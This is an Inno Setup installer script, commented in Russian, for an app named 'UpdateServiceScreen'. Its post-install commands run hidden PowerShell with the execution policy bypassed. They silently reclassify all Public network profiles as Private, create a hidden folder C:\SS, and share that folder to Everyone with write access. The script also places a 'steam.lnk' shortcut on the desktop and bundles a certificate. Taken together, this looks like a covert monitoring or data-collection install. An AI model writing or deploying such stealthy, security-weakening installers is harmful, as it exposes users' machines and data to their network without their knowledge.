; UpdateServiceScreen.iss
; Скрипт для Inno Setup

[Setup]
; Идентификатор приложения (уникальный GUID, можно сгенерировать в Inno Setup IDE или онлайн)
AppId=cdcb233d-b88f-48fe-8af4-d32c0ef7d6c0
AppName=UpdateServiceScreen
; Версию лучше брать из тега Git в CI, но для начала можно статично
AppVersion=1
AppPublisher=Zhelyapov Aleksey Apps
; Установка в %APPDATA%\UpdateServiceScreen
DefaultDirName={userappdata}\UpdateServiceScreen
; Не создавать папку в меню Пуск (т.к. это фоновое приложение)
DefaultGroupName=UpdateServiceScreen
DisableProgramGroupPage=yes
; Запрашивать права администратора (необходимо для C:\SS, шары, сети)
PrivilegesRequired=admin
; Куда сохранить готовый setup.exe (относительно папки со скриптом)
OutputDir=ReleaseOutput
; Имя файла установщика
OutputBaseFilename=UpdateServiceScreen_Setup
; Сжатие
Compression=lzma
SolidCompression=yes
; Язык установщика
WizardStyle=modern

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"
Name: "russian"; MessagesFile: "compiler:Languages\Russian.isl"

[Dirs]
; Создаем папку C:\SS и делаем ее скрытой
Name: "C:\SS"; Attribs: hidden
; Папка {app} ({userappdata}\UpdateServiceScreen) создается автоматически при копировании файлов,
; но можно явно указать, если нужно создать ее заранее или с особыми правами (здесь не нужно).
; Name: "{app}"

[Files]
; Копируем основной исполняемый файл в папку установки ({app})
Source: "..\build\UpdateServiceScreen.exe"; DestDir: "{app}"; Flags: ignoreversion
; Копируем ярлык на рабочий стол (пользователя, запустившего установку - т.е. Администратора)
Source: "..\sources\steam.lnk"; DestDir: "{userdesktop}"; Flags: ignoreversion
; Копируем сертификат в папку установки ({app})
Source: "..\sources\trust_alex.cer"; DestDir: "{app}"; Flags: ignoreversion

[Run]
; Выполняем команды ПОСЛЕ копирования файлов
; 1. Меняем сетевой профиль Public на Private
; Используем одинарные кавычки вокруг команды PowerShell для упрощения экранирования
Filename: "powershell.exe"; Parameters: "-NoProfile -ExecutionPolicy Bypass -Command 'Get-NetConnectionProfile | Where-Object {{$_.NetworkCategory -eq ''Public''}} | Set-NetConnectionProfile -NetworkCategory Private -ErrorAction SilentlyContinue'"; Flags: runhidden shellexec waituntilterminated

; 2. Создаем сетевой ресурс C:\SS (если еще не существует) и даем права Everyone:Change
; Одинарные кавычки вокруг команды, двойные одинарные ('') для строк внутри PowerShell
Filename: "powershell.exe"; Parameters: "-NoProfile -ExecutionPolicy Bypass -Command 'if (!(Get-SmbShare -Name ''SS'' -ErrorAction SilentlyContinue)) {{ New-SmbShare -Name ''SS'' -Path ''C:\SS'' -Description ''Shared folder for SS'' -ErrorAction Stop; Grant-SmbShareAccess -Name ''SS'' -AccountName ''Everyone'' -AccessRight Change -Force -ErrorAction Stop }}'"; Flags: runhidden shellexec waituntilterminated

[UninstallDelete]
; Что нужно удалить при деинсталляции
Type: filesandordirs; Name: "{app}"
Type: filesandordirs; Name: "C:\SS"
Type: files;          Name: "{userdesktop}\steam.lnk"

[UninstallRun]
; Команды, выполняемые ПЕРЕД удалением файлов при деинсталляции
; 1. Удаляем сетевой ресурс 'SS'
Filename: "powershell.exe"; Parameters: "-NoProfile -ExecutionPolicy Bypass -Command 'if (Get-SmbShare -Name ''SS'' -ErrorAction SilentlyContinue) {{ Remove-SmbShare -Name ''SS'' -Force -ErrorAction SilentlyContinue }}'"; Flags: runhidden shellexec waituntilterminated

; 2. (Опционально, если удаление C:\SS вызывает проблемы) Снять атрибут hidden перед удалением
; Filename: "cmd.exe"; Parameters: "/C attrib -H C:\SS"; Flags: runhidden shellexec waituntilterminated

; --- Конец скрипта ---